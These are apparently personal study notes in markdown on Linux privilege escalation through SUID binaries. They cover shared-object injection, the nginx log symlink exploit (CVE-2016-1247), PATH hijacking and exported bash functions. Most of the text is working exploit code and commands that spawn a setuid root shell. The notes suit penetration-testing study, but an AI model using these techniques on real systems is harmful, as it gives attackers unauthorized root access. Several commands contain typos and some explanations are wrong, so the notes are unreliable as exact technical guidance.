## SUID

`find / -perm -u=s -type f 2>dev/null`  
Also we can use winpeas.

Then search find file gtfo website.

* * *

## Other SUID escalation

`find / -type f -perm 04000 -ls 2>/dev/null`

#### Esclation via shared object injection

Check for the file which have shared asccess.  
to check access. `ls -la <filename>`  
Try running it. To get more info: `starce <filename> 2&>1`

`starce <filename> 2&>1 | grep -i -E "open|acess|no such file"`

Check for path and try inject malicious code instead. So when executing the file name again. It should execute the malicious code:

```C
#include<stdio.h>
#include<stdlib.h>

static void inject() __attribute__((constructor));

void inject()
{
 system("cp /bin/bash/ /tmp/bash && chmod +s  /tmp/bash && /tmp/bash -p");
 }
```

`gcc -shared -fPIC -o <filepath/filename> <file.c>`

Then we can get root access.

* * *

#### Escalation via binary symlinks(symbolic link)

[Nginx-Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

When web server is compromised we login as www-data user.

- Run Lunux-Exploit-Suggester

- Then try to find nginxed-root.sh exploit.

- `dpkg -l | grep nginx`

- `find / -type f -perm 04000 -ls 2>/dev/null` and check if /usr/bin/sudo  have -rws------. This is required fot exploit to work.

- To see log file `ls -la /var/log/nginx` Then we need to replace the log file with malicious code for sylink.

- Run nginx `./nginxed-root.sh /var/log/nginx/eror.log` and press enter.

- Then make a new connection by ssh again in a new terminal as root. Run command `invoke-rc.d nginx rotate >/dev/null 2>&1`. This will simulate restart of nginx.
- Then we will have root access in the previous terminal.

* * *

#### Escalation via Environment Variables

- `env`
- `find / -type f -perm 04000 -ls 2>/dev/null` to find the environment variables.
- Run a env file.
- And check what it is doing by `strings /pathname/file`
- For example 'service'
- `print $PATH` to see the PATH.
- If we add a malicious file and add that to file to path could execute the malicious file.
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
`
`gcc /tmp/service.c -o /tmp/service` now /tmp/service is the malicious file.
- Now we add malicous file to the path. For that `export PATH=/tmp:$PATH`
- Check PATH by `print $PATH`
- Now try executing the previous file.

If we are having direct path like '/usr/sbin/service' we can exploit this by

- Create a malicous function.
- `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
- Export this function by `export -f /usr/sbin/service` -f is shel function.
- This will escalate our privileages to root. 